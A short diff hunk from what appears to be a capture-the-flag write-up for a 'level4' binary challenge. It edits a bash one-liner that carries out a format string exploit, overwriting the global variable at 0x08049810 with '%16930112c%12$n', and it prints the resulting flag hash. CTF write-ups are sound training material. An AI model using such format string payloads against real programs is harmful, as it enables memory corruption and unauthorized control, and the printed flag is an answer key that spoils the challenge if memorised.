@@ -219,7 +219,7 @@ We need the *global variable* `m` (in the address `0x08049810`) to be equal to *
 
 We can execute the `printf` buffer to store the number *16930116* on the address `0x08049810` where the `m` variable is with this line. Of course, because we are running a shell through a pipe, we can keep the `stdin` open like the same trick from the last level:
 ```bash
-$(printf '\x10\x98\x04\x08' && echo '%16930112c%12$n' ; cat ) | ./level4
+$ (printf '\x10\x98\x04\x08' && echo '%16930112c%12$n' ) | ./level4
 
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
